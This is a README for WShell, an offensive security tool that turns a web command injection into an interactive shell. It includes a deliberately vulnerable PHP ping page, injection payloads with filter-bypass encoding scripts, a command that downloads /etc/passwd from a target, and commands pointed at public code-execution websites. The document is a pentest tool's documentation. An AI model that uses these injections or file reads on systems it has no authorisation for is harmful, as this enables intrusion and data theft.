<h1 align="center">WShell</h1>

<p align="center">Turn a web-based command injection into an interactive shell.</p>

<p align="center">
    <a href="https://docs.python.org/3/"><img src="https://img.shields.io/badge/python-3-green.svg?style=for-the-badge&logo=python&logoColor=white" alt="Python 3"></a>
    <a href="https://github.com/unlock-security/wshell/blob/main/LICENSE"><img src="https://img.shields.io/github/license/unlock-security/wshell?style=for-the-badge&label=License&color=red" alt="WShell License"></a>
    <a href="https://github.com/unlock-security/wshell/releases/latest"><img src="https://img.shields.io/github/v/release/unlock-security/wshell?include_prereleases&sort=semver&display_name=release&style=for-the-badge" alt="GitHub Release"></a>
    <a href="https://www.unlock-security.it/?utm_source=github&utm_medium=repo&utm_campaign=wshell"><img src="https://img.shields.io/badge/Made_by-🔓_Unlock_Security-blue.svg?style=for-the-badge" alt="Made by Unlock Security"></a>
</p>

---

WShell takes a raw command injection point and turns it into something you can actually work with: persistent history, `cd` support, file transfers, and OS-aware behavior, all without uploading anything to the target.

Point it at a vulnerable endpoint, tell it where to inject, and it handles the rest.

## Installation

`pipx` or `uv` are recommended to keep dependencies isolated:

```shell
# pipx
pipx install git+https://github.com/unlock-security/wshell.git

# uv
uv tool install git+https://github.com/unlock-security/wshell.git
```

WShell checks for updates on startup. Pass `--no-update` to skip this, or `--include-prerelease` to track pre-releases.

## Quick start

Say you've found a command injection in a `ping.php` page:

```php
<?php
    $host = $_POST['host'];
    $count = intval($_GET['count']);
    $command = "ping -c {$count} {$host} 2>&1";
    echo "<pre>" . shell_exec($command) . "</pre>";
?>
```

Use the `WSHELL` placeholder to mark where commands get injected:

```shell
attacker@host:/$ wshell --log=info 'https://www.target.com/ping.php?count=3' 'host=;WSHELL #'
[13:37:00] [INFO] HTTP verb not specified. Using 'POST' based on parameters.
[13:37:00] [INFO] Target OS not specified, trying to automatically detect it.
[13:37:00] [INFO] Target OS detected as Linux.

www-data@target:/var/www/html/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

WShell detects the target OS (Linux, Windows CMD, or PowerShell) and adjusts behavior accordingly.

## Features

- **No upload required.** Works through the injection point directly — no web shell file needed.
- **`cd` and command history** work as expected across requests.
- **Input/output scripts** let you manipulate payloads and responses in a chain — useful for bypassing filters or decoding output (see [Scripts](#inputoutput-scripts)).
- **`download` and `upload` commands** handle file transfers in chunks and abstract away OS differences.
- **Full HTTP control** — method, headers, cookies, body format (form or JSON), delays, timeouts, redirects, custom User-Agent.
- **Extensible** — add your own scripts and commands without touching core code.

## Usage

```
wshell [OPTIONS] URL [REQUEST_ITEMS...]
```

`REQUEST_ITEMS` follows HTTPie-style syntax: `Key: value` for headers, `key=value` for body parameters. The `WSHELL` placeholder can go in any of these or in the URL itself.

### Options

| Category    | Argument                    | Description                                                      | Default                       |
| ----------- | --------------------------- | ---------------------------------------------------------------- | ----------------------------- |
| **Core**    | `URL`                       | The vulnerable endpoint.                                         | (required)                    |
|             | `REQUEST ITEMS...`          | Headers (`Key: value`) and body data (`key=value`).              | —                             |
|             | `--os`                      | Target OS/shell: `linux`, `win-cmd`, `win-psh`.                  | Auto-detected                 |
|             | `--placeholder`             | Injection placeholder string.                                    | `WSHELL`                      |
|             | `--prompt`                  | Static prompt string instead of the dynamic one.                 | (dynamic)                     |
| **HTTP**    | `-m, --method`              | HTTP method.                                                     | POST if body params, else GET |
|             | `-t, --timeout`             | Connection timeout in seconds. `--no-timeout` to disable.        | `3.0`                         |
|             | `-d, --delay`               | Delay between requests, in seconds.                              | `0`                           |
|             | `--data-raw`                | Raw body string (form-urlencoded or JSON).                       | —                             |
|             | `-j, --json` / `-f, --form` | Serialize body as JSON or form fields.                           | `--form`                      |
|             | `--keep-alive`              | Persistent connection. `--no-keep-alive` to disable.             | `True`                        |
|             | `--follow`                  | Follow redirects. `--no-follow` to disable.                      | `True`                        |
|             | `-ua, --user-agent`         | Custom User-Agent string.                                        | `WShell X.Y.Z`                |
|             | `-r, --random-agent`        | Pick a random User-Agent from the built-in list.                 | `False`                       |
| **Scripts** | `--input-scripts`           | Comma-separated script chain applied to commands before sending. | —                             |
|             | `--output-scripts`          | Comma-separated script chain applied to server responses.        | —                             |
|             | `--list-scripts`            | Print all available scripts.                                     | —                             |
| **App**     | `--log`                     | Log level: `critical`, `error`, `warning`, `info`, `debug`.      | `warning`                     |
|             | `--update` / `--no-update`  | Toggle auto-update on startup.                                   | `True`                        |
|             | `--include-prerelease`      | Include pre-releases in the update check.                        | `False`                       |
|             | `-v, --version`             | Print version and exit.                                          | —                             |
|             | `-h, --help`                | Print help and exit.                                             | —                             |

---

## Input/output scripts

Scripts transform the command payload before it's sent (input scripts) or process the server's response after it's received (output scripts). They're most useful when the target requires encoded input or returns encoded/escaped output.

Run them in a comma-separated chain with `--input-scripts` or `--output-scripts`:

```shell
# Replace spaces with ${IFS}, then base64-encode — useful for filters that block spaces
wshell --input-scripts=space2ifs,base64encode 'http://example.com/vuln?cmd=WSHELL'
```

List all available scripts:

```shell
wshell --list-scripts
```

## Built-in commands

Type `help -v` at the WShell prompt to see all custom commands. The most useful one out of the box is `download`:

```
victim@vulnerable-server:/var/www/html/$ download -r /etc/passwd -l passwd.txt
[INFO] Downloading 2337 bytes as 3 chunks (1024 bytes each)
Downloading chunk 3/3
[INFO] File '/etc/passwd' downloaded to 'passwd.txt'
```

It handles chunking and encoding automatically, regardless of whether you're on Linux or Windows.

## Extending WShell

### Adding a script

Create a Python file in `wshell/scripts/input/` or `wshell/scripts/output/`. The filename becomes the script's name. Define a `run(data: str) -> str` function with a docstring.

```python
# wshell/scripts/input/reverse.py
def run(command: str) -> str:
    """Reverses the command string."""
    return command[::-1]
```

Now `--input-scripts=reverse` works.

### Adding a custom command

Create a Python file in a subdirectory of `wshell/commands/`. The directory name sets the category shown in `help`. Your class should inherit from `wshell.commands.WShellCommandSet` and follow the [cmd2 modular commands](https://cmd2.readthedocs.io/en/stable/features/modular_commands/) pattern.

Use `self._cmd.injector` to run commands on the target, and `self._dispatch()` to handle OS-specific logic.

```python
# wshell/commands/php/phpinfo.py
import argparse
from cmd2 import with_argparser
from wshell.commands import WShellCommandSet

class PHPInfoCommandSet(WShellCommandSet):
    _argparser = argparse.ArgumentParser(description="Create a phpinfo() file.")
    _argparser.add_argument("-f", "--filename", default="info.php", help="Name of the file.")

    @with_argparser(_argparser)
    def do_phpinfo(self, args) -> None:
        """Creates a file that runs phpinfo() in the current directory."""
        file_content = "<?php phpinfo();"
        self._dispatch("write_file", args.filename, file_content)
        self._cmd.poutput(f"PHP info file created at '{args.filename}'")

    def _linux_write_file(self, filename, content):
        self._cmd.injector.execute(f"echo -n '{content}' > {filename}")

    def _win_psh_write_file(self, filename, content):
        self._cmd.injector.execute(f"Set-Content -Path '{filename}' -Value '{content}'")

    def _win_cmd_write_file(self, filename, content):
        self._cmd.injector.execute(f"echo {content} > {filename}")
```

## Some real targets to test with

These are public, intentionally vulnerable platforms you can use to try WShell without setting anything up:

```sh
# cmdchallenge.com — online shell challenge platform
wshell --input-scripts=base64encode --output-scripts=unescape --delay=1.5 \
  'https://cmdchallenge.com/c/r' 'cmd=WSHELL' 'slug=create_file'

# learnshell.org — code execution sandbox
wshell --output-scripts=unescape --json \
  'https://www.learnshell.org/' 'code=WSHELL' 'language=bash'

# onecompiler.com — online compiler API
wshell --json --output-scripts=unescape \
  'https://onecompiler.com/api/code/exec' \
  'properties[language]=bash' \
  'properties[files][][content]=WSHELL'
```

## Local development

```sh
git clone https://github.com/unlock-security/wshell
cd wshell/
python3 -m venv .venv
source .venv/bin/activate
pip install -e .
```

## Contributing

Check the open [Issues](https://github.com/unlock-security/wshell/issues) and [Pull Requests](https://github.com/unlock-security/wshell/pulls) before opening something new. The [contribution guide](https://github.com/unlock-security/wshell/blob/main/CONTRIBUTING.md) has more details.

## License

GPL-3.0. See [LICENSE](https://github.com/unlock-security/wshell/blob/main/LICENSE).

---

<p align="center">Made with 💙 by <a href="https://www.unlock-security.it/?utm_source=github&utm_medium=repo&utm_campaign=wshell" target="_blank">Unlock Security</a></p>
<p align="center">
    <img src="https://www.unlock-security.it/wp-content/uploads/2026/04/unlock-security-registered-logo-rgb.svg" width="150">
</p>
